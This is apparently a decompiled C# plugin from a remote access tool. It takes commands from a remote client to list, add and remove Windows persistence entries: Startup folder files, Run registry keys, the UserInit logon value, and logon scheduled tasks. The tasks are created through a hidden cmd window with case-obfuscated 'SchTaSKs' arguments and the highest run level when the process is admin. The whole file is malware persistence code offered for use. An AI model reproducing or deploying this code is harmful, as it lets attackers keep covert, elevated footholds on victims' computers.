using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;
using Leb128;
using Microsoft.Win32;
using Microsoft.Win32.TaskScheduler;
using Plugin.Helper;

namespace Plugin;

internal class Packet
{
	public static void Read(byte[] data)
	{
		try
		{
			object[] array = LEB128.Read(data);
			switch ((string)array[0])
			{
			case "Refresh":
				Client.Send(LEB128.Write(GetAutoRuns()));
				break;
			case "Remove":
				Client.Send(LEB128.Write(Remove((string)array[1])));
				break;
			case "Set":
				Client.Send(LEB128.Write(Set((string)array[1], (string)array[2], (string)array[3])));
				break;
			}
		}
		catch (Exception ex)
		{
			Client.Send(LEB128.Write(new object[3] { "AutoRun", "Error", ex.Message }));
			Client.Error(ex.ToString());
		}
	}

	public static object[] Set(string type, string name, string path)
	{
		switch (type)
		{
		case "StartUp":
			File.Copy(path, Path.Combine(Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Startup), name)));
			return new object[5] { "AutoRun", "Set", type, name, path };
		case "CurrentUser":
			Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true).SetValue(name, path);
			return new object[5] { "AutoRun", "Set", type, name, path };
		case "LocalMachine":
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true).SetValue(name, path);
			return new object[5] { "AutoRun", "Set", type, name, path };
		case "Node32":
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true).SetValue(name, path);
			return new object[5] { "AutoRun", "Set", type, name, path };
		case "UserInit":
		{
			RegistryKey? registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			string text = (string)registryKey.GetValue("UserInit");
			registryKey.SetValue("UserInit", text + "," + path);
			return new object[5] { "AutoRun", "Set", type, name, path };
		}
		case "Sheduler":
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.FileName = "cmd";
			processStartInfo.Arguments = "/C SchTaSKs /CrEAte /F /sc OnLoGoN ";
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				processStartInfo.Verb = "runas";
				processStartInfo.Arguments += "/rl HighEst ";
			}
			ProcessStartInfo processStartInfo2 = processStartInfo;
			processStartInfo2.Arguments = processStartInfo2.Arguments + "/tn \"" + name + "\" /tr \"" + path + "\" & exit";
			Process process = new Process();
			process.StartInfo = processStartInfo;
			process.Start();
			return new object[5] { "AutoRun", "Set", type, name, path };
		}
		default:
			return new object[3]
			{
				"AutoRun",
				"Error",
				"Dont Set " + name
			};
		}
	}

	public static object[] Remove(string name)
	{
		string[] array = name.Split(new char[1] { ';' });
		switch (array[0])
		{
		case "StartUp":
		{
			string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
			foreach (string path in files)
			{
				if (Path.GetFileNameWithoutExtension(path) == array[1])
				{
					File.Delete(path);
					return new object[3] { "AutoRun", "Remove", name };
				}
			}
			break;
		}
		case "CurrentUser":
			Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true).DeleteValue(array[1]);
			return new object[3] { "AutoRun", "Remove", name };
		case "LocalMachine":
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true).DeleteValue(array[1]);
			return new object[3] { "AutoRun", "Remove", name };
		case "Node32":
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true).DeleteValue(array[1]);
			return new object[3] { "AutoRun", "Remove", name };
		case "UserInit":
		{
			RegistryKey? registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			string text = (string)registryKey.GetValue("UserInit");
			text = ((!text.Contains("," + array[1])) ? text.Replace(array[1], "") : text.Replace("," + array[1], ""));
			registryKey.SetValue("UserInit", text);
			return new object[3] { "AutoRun", "Remove", name };
		}
		case "Sheduler":
			new TaskService().GetFolder("\\").DeleteTask(array[1]);
			return new object[3] { "AutoRun", "Remove", name };
		}
		return new object[3]
		{
			"AutoRun",
			"Error",
			"Dont remove " + array[1]
		};
	}

	public static object[] GetAutoRuns()
	{
		List<object> list = new List<object>();
		list.AddRange(new object[2] { "AutoRun", "List" });
		try
		{
			string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
			foreach (string text in files)
			{
				list.AddRange(new object[3]
				{
					"StartUp",
					Path.GetFileNameWithoutExtension(text),
					text
				});
			}
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: false);
			string[] files = registryKey.GetValueNames();
			foreach (string text2 in files)
			{
				list.AddRange(new object[3]
				{
					"CurrentUser",
					text2,
					(string)registryKey.GetValue(text2)
				});
			}
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: false);
			string[] files = registryKey2.GetValueNames();
			foreach (string text3 in files)
			{
				list.AddRange(new object[3]
				{
					"LocalMachine",
					text3,
					(string)registryKey2.GetValue(text3)
				});
			}
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", writable: false);
			string[] files = registryKey3.GetValueNames();
			foreach (string text4 in files)
			{
				list.AddRange(new object[3]
				{
					"Node32",
					text4,
					(string)registryKey3.GetValue(text4)
				});
			}
		}
		catch
		{
		}
		try
		{
			string[] files = ((string)Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\winlogon", writable: false).GetValue("UserInit")).Split(new char[1] { ',' });
			foreach (string text5 in files)
			{
				list.AddRange(new object[3]
				{
					"UserInit",
					Path.GetFileNameWithoutExtension(text5),
					text5
				});
			}
		}
		catch
		{
		}
		try
		{
			foreach (Task task in new TaskService().GetFolder("\\").Tasks)
			{
				list.AddRange(new object[3] { "Sheduler", task.Name, task.Path });
			}
		}
		catch
		{
		}
		return list.ToArray();
	}
}
